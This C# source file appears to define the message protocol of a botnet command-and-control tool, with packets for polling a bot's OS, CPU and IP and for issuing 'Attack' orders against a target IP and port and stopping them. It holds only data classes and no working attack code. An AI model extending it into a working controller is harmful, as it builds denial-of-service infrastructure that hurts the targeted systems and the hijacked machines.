using Newtonsoft.Json;

namespace india_command_center;

public interface IPacket
{
    string type { get; }
}

public class Packet<T> : IPacket
{
    public string type { get; set; }
    public T content { get; set; }

    public Packet(string type, T content)
    {
        this.type = type;
        this.content = content;
    }
}

public class RequestStatus
{
}

public class ResponseStatus
{
    public string os { get; set; }
    public string cpu { get; set; }
    public string ip { get; set; }
}

public class Attack
{
    public int type { get; set; }
    public string ipPort { get; set; }
}

public class StopAttacks
{
}